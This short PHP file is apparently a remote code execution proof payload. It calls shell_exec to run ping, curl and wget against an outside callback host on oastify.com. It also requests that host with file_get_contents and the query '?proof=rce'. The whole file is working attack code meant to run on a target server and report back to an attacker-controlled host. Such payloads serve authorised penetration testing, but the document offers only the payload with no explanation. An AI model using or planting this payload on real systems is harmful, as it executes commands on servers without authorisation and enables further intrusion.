<?php
// Ping collaborator to prove execution
$collab = "gxh6anxkavv44romutrxq9lroiu9i0co1.oastify.com";
shell_exec("ping -c 1 $collab 2>&1");
shell_exec("curl http://$collab 2>&1");
shell_exec("wget http://$collab 2>&1");

// Or use PHP's file_get_contents
file_get_contents("http://$collab/?proof=rce");
?>
